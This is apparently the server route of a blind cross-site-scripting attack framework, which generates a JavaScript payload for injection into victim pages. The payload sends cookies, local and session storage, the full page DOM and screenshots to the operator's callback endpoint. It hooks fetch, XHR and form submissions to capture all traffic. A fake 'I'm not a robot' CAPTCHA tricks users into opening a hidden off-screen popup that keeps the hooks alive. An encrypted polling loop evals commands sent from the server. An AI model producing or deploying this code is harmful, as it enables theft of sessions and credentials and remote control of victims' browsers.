import { NextRequest, NextResponse } from 'next/server';
import { queryOne, Setting } from '@/lib/db';
import { corsHeaders } from '@/lib/cors';

async function getSetting(key: string, defaultValue: string): Promise<string> {
  try {
    const setting = await queryOne<Setting>(
      'SELECT value FROM settings WHERE key = $1',
      [key]
    );
    return setting?.value || defaultValue;
  } catch {
    return defaultValue;
  }
}

// Handle CORS preflight
export async function OPTIONS(request: NextRequest) {
  const headers: Record<string, string> = { ...corsHeaders };
  if (request.headers.get('Access-Control-Request-Private-Network')) {
    headers['Access-Control-Allow-Private-Network'] = 'true';
  }
  return new NextResponse(null, { status: 204, headers });
}

// AES-256-CBC encryption/decryption functions for payload (minified)
// Note: Web Crypto API only works in secure contexts (HTTPS or localhost)
// Payload will auto-fallback to unencrypted mode on HTTP targets
function getAesPayloadCode(key: string): string {
  // Key is 64 hex chars (32 bytes = 256 bits)
  // _cs = crypto.subtle available flag
  return `
var _k="${key}";var _cs=!!(window.crypto&&window.crypto.subtle);
function _h2b(h){for(var b=[],i=0;i<h.length;i+=2)b.push(parseInt(h.substr(i,2),16));return new Uint8Array(b)}
function _b2h(b){return Array.from(b).map(function(x){return x.toString(16).padStart(2,'0')}).join('')}
async function _enc(t){if(!_cs)return null;var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['encrypt']);var iv=crypto.getRandomValues(new Uint8Array(16));var e=await crypto.subtle.encrypt({name:'AES-CBC',iv:iv},k,new TextEncoder().encode(t));return _b2h(iv)+_b2h(new Uint8Array(e))}
async function _dec(c){if(!_cs)return null;try{var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['decrypt']);var iv=_h2b(c.substring(0,32));var d=_h2b(c.substring(32));var p=await crypto.subtle.decrypt({name:'AES-CBC',iv:iv},k,d);return new TextDecoder().decode(p)}catch(e){return null}}
`.replace(/\n/g, '');
}

export async function GET(request: NextRequest) {
  const baseUrl = process.env.NEXT_PUBLIC_APP_URL || `http://${request.headers.get('host')}`;
  const cb = `${baseUrl}/api/callback`;
  const ps = `${baseUrl}/api/persist`;
  const tf = `${baseUrl}/api/traffic`;

  const screenshotEnabled = await getSetting('screenshot_enabled', 'true') === 'true';
  const persistentEnabled = await getSetting('persistent_enabled', 'false') === 'true';
  const advancedPersistentEnabled = await getSetting('advanced_persistent_enabled', 'false') === 'true';
  const persistentKey = await getSetting('persistent_key', '');

  // Build payload  
  let js = `(function(){if(window.__n)return;window.__n=1;`;

  // Traffic interception - inject hooks IMMEDIATELY in main page before anything else
  if (persistentEnabled && advancedPersistentEnabled) {
    js += `
var _tf="${tf}";var _ps="${ps}";var _cb="${cb}";var _nxs="${baseUrl}";
function _isNx(u){if(!u)return false;try{var full=new URL(u,location.href).href;return full===_tf||full===_ps||full===_cb||full.indexOf(_tf+"?")===0||full.indexOf(_ps+"?")===0||full.indexOf(_cb+"?")===0}catch(e){return false}}
function _isStatic(u){if(!u)return false;try{var ext=u.split("?")[0].split("#")[0].toLowerCase();return /\\.(js|css|woff2?|ttf|eot|svg|png|jpg|jpeg|gif|ico|webp|mp4|webm|mp3|wav|ogg|pdf|wasm)$/.test(ext)||u.indexOf("unpkg.com")>-1||u.indexOf("cdnjs.cloudflare.com")>-1||u.indexOf("cdn.jsdelivr.net")>-1||u.indexOf("fonts.googleapis.com")>-1||u.indexOf("fonts.gstatic.com")>-1}catch(e){return false}}
var _pendingTraffic=[];
function _rpt(t,m,u,reqH,reqB,resH,resB,s){if(_isNx(u)||_isStatic(u))return;var data={type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s};if(window.__rid){try{var x=new XMLHttpRequest();x.open("POST",_tf,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s}))}catch(e){}}else{_pendingTraffic.push(data)}}
function _flushPending(){if(window.__rid&&_pendingTraffic.length){_pendingTraffic.forEach(function(d){try{var x=new XMLHttpRequest();x.open("POST",_tf,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,type:d.type,method:d.method,url:d.url,reqHeaders:d.reqHeaders,reqBody:d.reqBody,resHeaders:d.resHeaders,resBody:d.resBody,status:d.status}))}catch(e){}});_pendingTraffic=[]}}
function _getBrowserHeaders(url){var s="";try{var loc=new URL(url,location.href);s+="Host: "+loc.host+"\\r\\n"}catch(e){}s+="User-Agent: "+navigator.userAgent+"\\r\\n";s+="Accept: */*\\r\\n";if(document.referrer)s+="Referer: "+document.referrer+"\\r\\n";return s}
function _buildReqHeaders(url,customH,ck){var s=_getBrowserHeaders(url);for(var k in customH){s+=k+": "+customH[k]+"\\r\\n"}if(ck)s+="Cookie: "+ck+"\\r\\n";return s}
if(!window.__of){window.__of=window.fetch;window.fetch=function(){var a=arguments;var u=a[0];var o=a[1]||{};var url=typeof u==="string"?u:(u&&u.url?u.url:"");if(_isNx(url)||_isStatic(url))return window.__of.apply(window,a);var hdrs={};try{if(o.headers){if(typeof o.headers.forEach==="function"){o.headers.forEach(function(v,k){hdrs[k]=v})}else{for(var k in o.headers){hdrs[k]=o.headers[k]}}}}catch(e){}var ck=document.cookie||"";var rawReqH=_buildReqHeaders(url,hdrs,ck);var reqBody=o.body?String(o.body).substring(0,10000):null;return window.__of.apply(window,a).then(function(r){var resH="";try{r.headers.forEach(function(v,k){resH+=k+": "+v+"\\r\\n"})}catch(e){}var ct="";try{ct=r.headers.get("content-type")||""}catch(e){}if(ct.indexOf("image")>-1||ct.indexOf("font")>-1){_rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[binary]",r.status);return r}try{var rc=r.clone();rc.text().then(function(t){_rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,t.substring(0,10000),r.status)}).catch(function(){_rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[read error]",r.status)})}catch(e){_rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[exception]",r.status)}return r}).catch(function(e){_rpt("fetch",o.method||"GET",url,rawReqH,reqBody,null,null,0);throw e})}}
if(!window.__OX){window.__OX=window.XMLHttpRequest;window.XMLHttpRequest=function(){var x=new window.__OX();var m="GET",u="",rh={},reqBody=null,rawReqH="";var oo=x.open;x.open=function(mt,ur){m=mt;u=ur;return oo.apply(x,arguments)};var osh=x.setRequestHeader;x.setRequestHeader=function(k,v){rh[k]=v;return osh.apply(x,arguments)};var os=x.send;x.send=function(b){if(_isNx(u)||_isStatic(u))return os.apply(x,arguments);var ck=document.cookie||"";rawReqH=_buildReqHeaders(u,rh,ck);reqBody=b?String(b).substring(0,10000):null;x.addEventListener("load",function(){var resH=x.getAllResponseHeaders()||"";var ct=x.getResponseHeader("content-type")||"";var resBody=null;if(ct.indexOf("image")>-1||ct.indexOf("font")>-1){resBody="[binary]"}else{try{resBody=x.responseText?x.responseText.substring(0,10000):null}catch(e){resBody="[read error]"}}_rpt("xhr",m,u,rawReqH,reqBody,resH,resBody,x.status)});x.addEventListener("error",function(){_rpt("xhr",m,u,rawReqH,reqBody,null,null,0)});return os.apply(x,arguments)};return x}}
document.addEventListener("submit",function(e){var f=e.target;if(!f||f.tagName!=="FORM")return;try{var fd=new FormData(f);var data={};fd.forEach(function(v,k){data[k]=v});var action=f.action||location.href;if(_isNx(action)||_isStatic(action))return;var ck=document.cookie||"";var rawH=_buildReqHeaders(action,{"Content-Type":"application/x-www-form-urlencoded"},ck);_rpt("form",f.method?f.method.toUpperCase():"POST",action,rawH,JSON.stringify(data),null,null,null)}catch(e){}},true);
`.replace(/\n/g, '');
  }

  // Data collection
  js += `var d={uri:location.href,origin:location.hostname,referer:document.referrer,"user-agent":navigator.userAgent,cookies:document.cookie,timestamp:new Date().toISOString(),screenWidth:screen.width,screenHeight:screen.height};`;
  js += `try{var l={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(k)}d.localstorage=JSON.stringify(l)}catch(e){}`;
  js += `try{var s={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k)}d.sessionstorage=JSON.stringify(s)}catch(e){}`;
  js += `try{d.dom=document.documentElement.outerHTML;if(d.dom.length>5000000)d.dom=d.dom.substring(0,5000000)}catch(e){d.dom="[DOM capture failed: "+e.message+"]"}`;

  // Send function - FIXED: onload inside send()
  js += `function send(){var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
  js += `x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.id){window.__rid=r.id;`;

  // Flush pending traffic and initialize advanced features after we have report ID
  if (persistentEnabled && advancedPersistentEnabled) {
    js += `_flushPending();setTimeout(function(){initAdvanced()},100);`;
  }

  js += `}}catch(e){}};`;
  js += `x.send(JSON.stringify(d))}`;

  if (screenshotEnabled) {
    js += `var sc=document.createElement("script");sc.src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";`;
    js += `sc.onload=function(){try{html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true,scale:1,width:Math.min(document.documentElement.scrollWidth,1920),height:Math.min(document.documentElement.scrollHeight,4000)}).then(function(c){d.screenshot=c.toDataURL("image/jpeg",0.8);send()}).catch(function(e){d.screenshot_error="html2canvas: "+e.message;send()})}catch(e){d.screenshot_error="html2canvas exception: "+e.message;send()}};`;
    js += `sc.onerror=function(){d.screenshot_error="Failed to load html2canvas from CDN";send()};`;
    js += `setTimeout(function(){if(!d.screenshot&&!d.screenshot_error){d.screenshot_error="html2canvas timeout";send()}},10000);`;
    js += `document.head.appendChild(sc);`;
  } else {
    js += `send();`;
  }

  // Traffic Interception Mode - Auxiliary window controller
  // Uses Base64 encoding to avoid escaping issues in document.write()
  if (persistentEnabled && advancedPersistentEnabled) {
    const useEncryption = persistentKey && persistentKey.length === 64;
    
    // AES encryption functions for popup (if enabled)
    const aesCode = useEncryption ? `
var _k="${persistentKey}";var _cs=!!(window.crypto&&window.crypto.subtle);
function _h2b(h){for(var b=[],i=0;i<h.length;i+=2)b.push(parseInt(h.substr(i,2),16));return new Uint8Array(b)}
function _b2h(b){return Array.from(b).map(function(x){return x.toString(16).padStart(2,'0')}).join('')}
async function _enc(t){if(!_cs)return null;var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['encrypt']);var iv=crypto.getRandomValues(new Uint8Array(16));var e=await crypto.subtle.encrypt({name:'AES-CBC',iv:iv},k,new TextEncoder().encode(t));return _b2h(iv)+_b2h(new Uint8Array(e))}
` : '';

    // Popup script code - will be base64 encoded
    // Combined request+response in single entry for efficiency
    const popupCode = `
${aesCode}
var main=window.opener;
var rid=main.__rid;
var tf="${tf}";
var ps="${ps}";
var nxs="${baseUrl}";
function isNx(u){if(!u)return false;try{var full=new URL(u,main.location.href).href;return full.indexOf(tf)===0||full.indexOf(ps)===0||full.indexOf(nxs+"/api/callback")===0}catch(e){return false}}
function isStatic(u){if(!u)return false;try{var ext=u.split("?")[0].split("#")[0].toLowerCase();return /\\.(js|css|woff2?|ttf|eot|svg|png|jpg|jpeg|gif|ico|webp|mp4|webm|mp3|wav|ogg|pdf|wasm)$/.test(ext)||u.indexOf("unpkg.com")>-1||u.indexOf("cdnjs.cloudflare.com")>-1||u.indexOf("cdn.jsdelivr.net")>-1||u.indexOf("fonts.googleapis.com")>-1||u.indexOf("fonts.gstatic.com")>-1}catch(e){return false}}
${useEncryption ? `
async function rpt(t,m,u,reqH,reqB,resH,resB,s){
  if(isNx(u)||isStatic(u))return;
  try{
    var payload=JSON.stringify({type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s});
    var enc=_cs?await _enc(payload):null;
    var x=new XMLHttpRequest();x.open("POST",tf,true);x.setRequestHeader("Content-Type","application/json");
    x.send(JSON.stringify({rid:rid,encrypted:!!enc,data:enc||payload}));
  }catch(e){}
}` : `
function rpt(t,m,u,reqH,reqB,resH,resB,s){
  if(isNx(u)||isStatic(u))return;
  try{var x=new XMLHttpRequest();x.open("POST",tf,true);x.setRequestHeader("Content-Type","application/json");
  x.send(JSON.stringify({rid:rid,type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s}))}catch(e){}
}`}
function sstat(s){try{var x=new XMLHttpRequest();x.open("POST",ps,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:rid,status:s}))}catch(e){}}
function getBrowserHeaders(w,url){
  var s="";
  try{
    var loc=new URL(url,w.location.href);
    s+="Host: "+loc.host+"\\r\\n";
  }catch(e){}
  s+="User-Agent: "+w.navigator.userAgent+"\\r\\n";
  s+="Accept: */*\\r\\n";
  s+="Accept-Language: "+(w.navigator.languages?w.navigator.languages.join(", "):w.navigator.language)+"\\r\\n";
  s+="Accept-Encoding: gzip, deflate\\r\\n";
  if(w.document.referrer)s+="Referer: "+w.document.referrer+"\\r\\n";
  s+="Connection: keep-alive\\r\\n";
  if(w.navigator.doNotTrack==="1")s+="DNT: 1\\r\\n";
  return s;
}
function buildReqHeaders(w,url,customH,ck){
  var s=getBrowserHeaders(w,url);
  for(var k in customH){s+=k+": "+customH[k]+"\\r\\n"}
  if(ck)s+="Cookie: "+ck+"\\r\\n";
  return s;
}
function injectHooks(w){
  if(!w||w.__xh)return;w.__xh=1;
  var of=w.fetch;
  w.fetch=function(){
    var a=arguments;var u=a[0];var o=a[1]||{};
    var url=typeof u==="string"?u:(u&&u.url?u.url:"");
    if(isNx(url)||isStatic(url))return of.apply(w,a);
    var hdrs={};try{if(o.headers){if(typeof o.headers.forEach==="function"){o.headers.forEach(function(v,k){hdrs[k]=v})}else{for(var k in o.headers){hdrs[k]=o.headers[k]}}}}catch(e){}
    var ck="";try{ck=w.document.cookie||""}catch(e){}
    var rawReqH=buildReqHeaders(w,url,hdrs,ck);
    var reqBody=o.body?String(o.body).substring(0,10000):null;
    return of.apply(w,a).then(function(r){
      var resH="";try{r.headers.forEach(function(v,k){resH+=k+": "+v+"\\r\\n"})}catch(e){}
      var ct="";try{ct=r.headers.get("content-type")||""}catch(e){}
      if(ct.indexOf("image")>-1||ct.indexOf("font")>-1||ct.indexOf("video")>-1||ct.indexOf("audio")>-1){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[binary content]",r.status);return r}
      try{var rc=r.clone();rc.text().then(function(t){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,t.substring(0,10000),r.status)}).catch(function(){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[failed to read body]",r.status)})}catch(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[exception reading body]",r.status)}
      return r
    }).catch(function(e){rpt("fetch",o.method||"GET",url,rawReqH,reqBody,null,null,0);throw e})
  };
  var OX=w.XMLHttpRequest;
  w.XMLHttpRequest=function(){
    var x=new OX();var m="GET",u="",rh={},reqBody=null,rawReqH="";
    var oo=x.open;x.open=function(mt,ur){m=mt;u=ur;return oo.apply(x,arguments)};
    var osh=x.setRequestHeader;x.setRequestHeader=function(k,v){rh[k]=v;return osh.apply(x,arguments)};
    var os=x.send;x.send=function(b){
      if(isNx(u)||isStatic(u))return os.apply(x,arguments);
      var ck="";try{ck=w.document.cookie||""}catch(e){}
      rawReqH=buildReqHeaders(w,u,rh,ck);
      reqBody=b?String(b).substring(0,10000):null;
      x.addEventListener("load",function(){
        var resH=x.getAllResponseHeaders()||"";
        var ct=x.getResponseHeader("content-type")||"";
        var resBody=null;
        if(ct.indexOf("image")>-1||ct.indexOf("font")>-1||ct.indexOf("video")>-1||ct.indexOf("audio")>-1){resBody="[binary content]"}
        else{try{resBody=x.responseText?x.responseText.substring(0,10000):x.response?String(x.response).substring(0,10000):null}catch(e){resBody="[failed to read response]"}}
        rpt("xhr",m,u,rawReqH,reqBody,resH,resBody,x.status)
      });
      x.addEventListener("error",function(){
        rpt("xhr",m,u,rawReqH,reqBody,null,null,0)
      });
      return os.apply(x,arguments)
    };
    return x
  };
  try{w.document.addEventListener("submit",function(e){
    var f=e.target;if(!f||f.tagName!=="FORM")return;
    try{var fd=new FormData(f);var data={};fd.forEach(function(v,k){data[k]=v});
    var action=f.action||w.location.href;
    if(isNx(action)||isStatic(action))return;
    var ck="";try{ck=w.document.cookie||""}catch(e){}
    var rawH=buildReqHeaders(w,action,{"Content-Type":"application/x-www-form-urlencoded"},ck);
    rpt("form",f.method?f.method.toUpperCase():"POST",action,rawH,JSON.stringify(data),null,null,null)}catch(e){}
  },true)}catch(e){}
}
var terminated=false;
var lastInjectedUrl="";
var _injecting=false;
function tryInject(){
  if(_injecting)return;
  _injecting=true;
  try{
    if(!main||!main.document)return;
    var target=main.document.head||main.document.documentElement||main.document.body;
    if(!target){_injecting=false;return}
    if(main.__nxHooked){_injecting=false;return}
    main.__nxHooked=true;
    main.__nxRid=rid;main.__nxTf=tf;main.__nxPs=ps;main.__nxCb=nxs+"/api/callback";
    main.__nxIsNx=function(u){if(!u)return false;try{var full=new URL(u,main.location.href).href;return full===main.__nxTf||full===main.__nxPs||full===main.__nxCb||full.indexOf(main.__nxTf+"?")===0||full.indexOf(main.__nxPs+"?")===0||full.indexOf(main.__nxCb+"?")===0}catch(e){return false}};
    main.__nxIsStatic=function(u){if(!u)return false;try{var ext=u.split("?")[0].split("#")[0].toLowerCase();return /\\.(js|css|woff2?|ttf|eot|svg|png|jpg|jpeg|gif|ico|webp|mp4|webm|mp3|wav|ogg|pdf|wasm)$/.test(ext)||u.indexOf("unpkg.com")>-1||u.indexOf("cdnjs.cloudflare.com")>-1||u.indexOf("cdn.jsdelivr.net")>-1||u.indexOf("fonts.googleapis.com")>-1||u.indexOf("fonts.gstatic.com")>-1}catch(e){return false}};
    main.__nxGetHeaders=function(url){var s="";try{var loc=new URL(url,main.location.href);s+="Host: "+loc.host+"\\r\\n"}catch(e){}s+="User-Agent: "+main.navigator.userAgent+"\\r\\n";s+="Accept: */*\\r\\n";s+="Accept-Language: "+(main.navigator.languages?main.navigator.languages.join(", "):main.navigator.language)+"\\r\\n";s+="Accept-Encoding: gzip, deflate\\r\\n";if(main.document.referrer)s+="Referer: "+main.document.referrer+"\\r\\n";s+="Connection: keep-alive\\r\\n";if(main.navigator.doNotTrack==="1")s+="DNT: 1\\r\\n";return s};
    main.__nxBuildReq=function(url,customH,ck){var s=main.__nxGetHeaders(url);for(var k in customH){s+=k+": "+customH[k]+"\\r\\n"}if(ck)s+="Cookie: "+ck+"\\r\\n";return s};
    main.__nxRpt=function(t,m,u,reqH,reqB,resH,resB,st){if(main.__nxIsNx(u)||main.__nxIsStatic(u))return;try{var x=new main.__nxOrigXHR();x.open("POST",main.__nxTf,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:main.__nxRid,type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:st}))}catch(e){}};
    if(!main.__nxOrigFetch){
      main.__nxOrigFetch=main.fetch;
      main.fetch=function(){var a=arguments;var u=a[0];var o=a[1]||{};var url=typeof u==="string"?u:(u&&u.url?u.url:"");if(main.__nxIsNx(url)||main.__nxIsStatic(url))return main.__nxOrigFetch.apply(main,a);var hdrs={};try{if(o.headers){if(typeof o.headers.forEach==="function"){o.headers.forEach(function(v,k){hdrs[k]=v})}else{for(var k in o.headers){hdrs[k]=o.headers[k]}}}}catch(e){}var ck=main.document.cookie||"";var rawReqH=main.__nxBuildReq(url,hdrs,ck);var reqBody=o.body?String(o.body).substring(0,10000):null;return main.__nxOrigFetch.apply(main,a).then(function(r){var resH="";try{r.headers.forEach(function(v,k){resH+=k+": "+v+"\\r\\n"})}catch(e){}var ct="";try{ct=r.headers.get("content-type")||""}catch(e){}if(ct.indexOf("image")>-1||ct.indexOf("font")>-1){main.__nxRpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[binary]",r.status);return r}try{var rc=r.clone();rc.text().then(function(t){main.__nxRpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,t.substring(0,10000),r.status)}).catch(function(){main.__nxRpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[read error]",r.status)})}catch(e){main.__nxRpt("fetch",o.method||"GET",url,rawReqH,reqBody,resH,"[exception]",r.status)}return r}).catch(function(e){main.__nxRpt("fetch",o.method||"GET",url,rawReqH,reqBody,null,null,0);throw e})};
    }
    if(!main.__nxOrigXHR){
      main.__nxOrigXHR=main.XMLHttpRequest;
      main.XMLHttpRequest=function(){var x=new main.__nxOrigXHR();var m="GET",u="",rh={},reqBody=null,rawReqH="";var oo=x.open;x.open=function(mt,ur){m=mt;u=ur;return oo.apply(x,arguments)};var osh=x.setRequestHeader;x.setRequestHeader=function(k,v){rh[k]=v;return osh.apply(x,arguments)};var os=x.send;x.send=function(b){if(main.__nxIsNx(u)||main.__nxIsStatic(u))return os.apply(x,arguments);var ck=main.document.cookie||"";rawReqH=main.__nxBuildReq(u,rh,ck);reqBody=b?String(b).substring(0,10000):null;x.addEventListener("load",function(){var resH=x.getAllResponseHeaders()||"";var ct=x.getResponseHeader("content-type")||"";var resBody=null;if(ct.indexOf("image")>-1||ct.indexOf("font")>-1){resBody="[binary]"}else{try{resBody=x.responseText?x.responseText.substring(0,10000):null}catch(e){resBody="[read error]"}}main.__nxRpt("xhr",m,u,rawReqH,reqBody,resH,resBody,x.status)});x.addEventListener("error",function(){main.__nxRpt("xhr",m,u,rawReqH,reqBody,null,null,0)});return os.apply(x,arguments)};return x};
    }
    try{main.document.addEventListener("submit",function(e){var f=e.target;if(!f||f.tagName!=="FORM")return;try{var fd=new FormData(f);var data={};fd.forEach(function(v,k){data[k]=v});var action=f.action||main.location.href;if(main.__nxIsNx(action)||main.__nxIsStatic(action))return;var ck=main.document.cookie||"";var rawH=main.__nxBuildReq(action,{"Content-Type":"application/x-www-form-urlencoded"},ck);main.__nxRpt("form",f.method?f.method.toUpperCase():"POST",action,rawH,JSON.stringify(data),null,null,null)}catch(e){}},true)}catch(e){}
    _injecting=false;
    return true;
  }catch(e){main.__nxHooked=false;_injecting=false;return false}
}
setInterval(function(){
  try{
    if(!main||main.closed){if(!terminated){terminated=true;sstat("terminated")}self.close();return}
    var curUrl=main.location.href;
    if(curUrl!==lastInjectedUrl){
      lastInjectedUrl=curUrl;
      main.__nxHooked=false;
      main.__nxOrigFetch=null;
      main.__nxOrigXHR=null;
      setTimeout(function(){tryInject()},50);
      var ck="";try{ck=main.document.cookie||""}catch(e){}
      var rawH=getBrowserHeaders(main,curUrl);
      if(ck)rawH+="Cookie: "+ck+"\\r\\n";
      rpt("navigation","GET",curUrl,rawH,null,null,null,null)
    }else if(!main.__nxHooked){
      tryInject();
    }
  }catch(e){}
},500);
tryInject();
sstat("popup_active");
`.trim();

    // Base64 encode the popup code
    const popupB64 = Buffer.from(popupCode).toString('base64');

    js += `
var _nxs="${baseUrl}";
var _ps="${ps}";
function _isNx(u){if(!u)return false;try{return u.indexOf(_nxs)===0||u.indexOf("/api/")===0}catch(e){return false}}
function _sstat(s){try{var x=new XMLHttpRequest();x.open("POST",_ps,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,status:s}))}catch(e){}}
function _showPopupPrompt(){
  if(document.getElementById("_xpop"))return;
  var code=atob("${popupB64}"),html="<html><head></head><body><scr"+"ipt>"+code+"</scr"+"ipt></body></html>";
  var d=document.createElement("div");d.id="_xpop";
  d.innerHTML='<style>@keyframes _xspin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes _xcheck{0%{stroke-dashoffset:30}100%{stroke-dashoffset:0}}</style><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);z-index:999999;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center"><div style="background:#fff;border-radius:3px;border:1px solid #d3d3d3;box-shadow:0 4px 16px rgba(0,0,0,0.3);width:302px"><div style="padding:12px 14px"><div style="display:flex;align-items:center;gap:14px"><div id="_xcap" style="width:28px;height:28px;border:2px solid #c1c1c1;border-radius:2px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:border-color 0.15s;background:#fff"><div id="_xbox"></div></div><span style="font-size:14px;color:#000;font-weight:400">I\\'m not a robot</span><div style="margin-left:auto;display:flex;flex-direction:column;align-items:center"><svg width="34" height="34" viewBox="0 0 24 24" fill="none"><path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" stroke="#4285f4" stroke-width="2"/><path d="M9 12l2 2 4-4" stroke="#34a853" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><span style="font-size:8px;color:#555;margin-top:2px">CAPTCHA</span><span style="font-size:7px;color:#555">Privacy - Terms</span></div></div></div><div style="background:#f9f9f9;border-top:1px solid #e0e0e0;padding:8px 14px;display:flex;justify-content:flex-end"><div style="font-size:10px;color:#555;display:flex;align-items:center;gap:3px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg><span>Verification required</span></div></div></div></div>';
  document.body.appendChild(d);
  var cap=document.getElementById("_xcap");
  var box=document.getElementById("_xbox");
  cap.onmouseover=function(){cap.style.borderColor="#4285f4"};
  cap.onmouseout=function(){if(!cap.dataset.clicked)cap.style.borderColor="#c1c1c1"};
  cap.onclick=function(){
    if(cap.dataset.clicked)return;cap.dataset.clicked="1";
    cap.style.borderColor="#4285f4";cap.style.cursor="default";
    box.innerHTML='<svg width="24" height="24" viewBox="0 0 24 24" style="animation:_xspin 0.8s linear infinite"><circle cx="12" cy="12" r="10" fill="none" stroke="#4285f4" stroke-width="3" stroke-dasharray="50" stroke-linecap="round"/></svg>';
    setTimeout(function(){
      box.innerHTML='<svg width="22" height="22" viewBox="0 0 24 24"><path d="M4 12l6 6L20 6" fill="none" stroke="#34a853" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="stroke-dasharray:30;stroke-dashoffset:30;animation:_xcheck 0.3s ease forwards"/></svg>';
      setTimeout(function(){
        var p=window.open("about:blank","_xc","width=1,height=1,left=-9999,top=-9999");
        if(p&&!p.closed){try{p.document.open();p.document.write(html);p.document.close();window.__xctrl=p;try{p.moveTo(-9999,-9999);p.resizeTo(1,1)}catch(e){}_sstat("popup_active")}catch(e){}}
        d.remove()
      },500)
    },1200)
  }
}
function initAdvanced(){
  _showPopupPrompt();
}
`.replace(/\n/g, '');
  }

  if (persistentEnabled) {
    const useEncryption = persistentKey && persistentKey.length === 64;

    if (useEncryption) {
      // Add AES functions
      js += getAesPayloadCode(persistentKey);

      // Encrypted poll loop with fallback for HTTP (no crypto.subtle)
      // Client sends {rid, nocrypto: true} if crypto.subtle is not available
      js += `(async function p(){setTimeout(async function(){if(!window.__rid){p();return}`;
      js += `var x=new XMLHttpRequest();x.open("POST","${ps}",true);x.setRequestHeader("Content-Type","application/json");`;
      js += `x.onload=async function(){try{var r=JSON.parse(x.responseText);`;
      // Check if we have crypto available
      js += `if(r.cmd){var cmd=_cs?await _dec(r.cmd):r.cmd;if(!cmd){p();return}`;
      // Execute command and capture result
      js += `var result;try{result=eval(cmd)}catch(e){result="Error: "+e.message}`;
      // Send result back - encrypt if crypto available
      js += `if(result!==undefined){var res=typeof result==="string"?result:JSON.stringify(result);var enc=_cs?await _enc(res):null;var rx=new XMLHttpRequest();rx.open("POST","${ps}",true);rx.setRequestHeader("Content-Type","application/json");rx.send(JSON.stringify({rid:window.__rid,response:enc||res,encrypted:!!enc}))}`;
      js += `}}catch(e){}p()};`;
      js += `x.onerror=function(){p()};x.send(JSON.stringify({rid:window.__rid,nocrypto:!_cs}))},3000)})();`;
    } else {
      // Unencrypted poll loop (legacy)
      js += `(function p(){setTimeout(function(){if(!window.__rid){p();return}`;
      js += `var x=new XMLHttpRequest();x.open("POST","${ps}",true);x.setRequestHeader("Content-Type","application/json");`;
      js += `x.onload=function(){try{var r=JSON.parse(x.responseText);`;
      js += `if(r.cmd){`;
      // Execute command and capture result
      js += `var result;try{result=eval(r.cmd)}catch(e){result="Error: "+e.message}`;
      // Send result back if there is one (not undefined and not a DOM alert/redirect)
      js += `if(result!==undefined){var rx=new XMLHttpRequest();rx.open("POST","${ps}",true);rx.setRequestHeader("Content-Type","application/json");rx.send(JSON.stringify({rid:window.__rid,response:typeof result==="string"?result:JSON.stringify(result)}))}}`;
      js += `}catch(e){}p()};`;
      js += `x.onerror=function(){p()};x.send(JSON.stringify({rid:window.__rid}))},3000)})();`;
    }
  }

  js += `})();`;

  return new NextResponse(js, {
    status: 200,
    headers: {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      ...corsHeaders,
    },
  });
}

